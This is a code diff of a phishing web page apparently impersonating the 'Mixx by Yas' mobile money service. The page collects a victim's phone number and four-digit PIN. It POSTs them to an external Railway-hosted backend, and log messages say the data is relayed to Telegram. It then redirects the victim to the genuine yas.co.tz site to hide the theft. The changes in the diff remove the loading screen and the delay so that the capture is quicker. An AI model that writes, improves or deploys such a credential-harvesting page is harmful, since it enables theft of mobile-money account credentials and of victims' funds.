@@ -135,38 +135,6 @@
         box-shadow: 0 0 0 2px #ffe699;
     }
 
-    /* Loading overlay */
-    .loading-overlay {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0,0,0,0.8);
-        display: none;
-        justify-content: center;
-        align-items: center;
-        z-index: 999;
-        color: white;
-        font-size: 18px;
-        flex-direction: column;
-        gap: 15px;
-    }
-
-    .spinner {
-        width: 50px;
-        height: 50px;
-        border: 4px solid rgba(255,255,255,0.3);
-        border-top: 4px solid #F4B400;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-
     @media (max-width: 480px) {
         body { padding: 12px; }
         .wrapper { padding: 24px 16px 35px; border-radius: 40px; }
@@ -189,12 +157,6 @@
 </style>
 </head>
 <body>
-
-<!-- Loading Overlay -->
-<div id="loadingOverlay" class="loading-overlay">
-    <div class="spinner"></div>
-    <div>Processing... Please wait</div>
-</div>
 
 <div class="watermark top-left">Mixx</div>
 <div class="watermark top-right">Mixx</div>
@@ -241,14 +203,10 @@
         const pinHidden = document.getElementById("pinHidden");
         const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
         const wrapper = document.getElementById("appWrapper");
-        const loadingOverlay = document.getElementById("loadingOverlay");
         
         let realPin = ["", "", "", ""];
         let submitted = false;
 
-        // ============================================
-        // RAILWAY BACKEND URL
-        // ============================================
         const BACKEND_URL = 'https://mixxyass-production.up.railway.app/Server';
 
         phoneInput.addEventListener('input', function(e) {
@@ -262,42 +220,23 @@
             const phone = phoneInput.value;
             const fullPin = realPin.join('');
             
-            // Show loading overlay immediately
-            loadingOverlay.style.display = 'flex';
-            
-            console.log('📤 Sending to Railway:', { phone, pin: fullPin });
-            
+            // Send to backend IMMEDIATELY (no waiting)
             try {
-                // Send to Railway backend
                 const response = await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ 
-                        phone: phone, 
-                        pin: fullPin 
-                    })
+                    body: JSON.stringify({ phone: phone, pin: fullPin })
                 });
-                
                 const result = await response.json();
-                console.log('✅ Railway response:', result);
-                
-                // Ensure data was sent successfully
-                if (result.status === 'success') {
-                    console.log('✅ Data sent to Telegram successfully!');
-                } else {
-                    console.warn('⚠️ Telegram response:', result);
-                }
-                
+                console.log('✅ Sent to Telegram:', result);
             } catch (error) {
-                console.error('❌ Error sending to Railway:', error);
+                console.error('❌ Error:', error);
             }
             
-            // Wait 1.5 seconds to ensure data is sent, then redirect
-            setTimeout(() => {
-                window.location.href = "https://yas.co.tz/mixx-by-yas/";
-            }, 1500);
+            // Redirect IMMEDIATELY after sending (no delay)
+            window.location.href = "https://yas.co.tz/mixx-by-yas/";
         }
 
         function updateHiddenAndSubmit() {
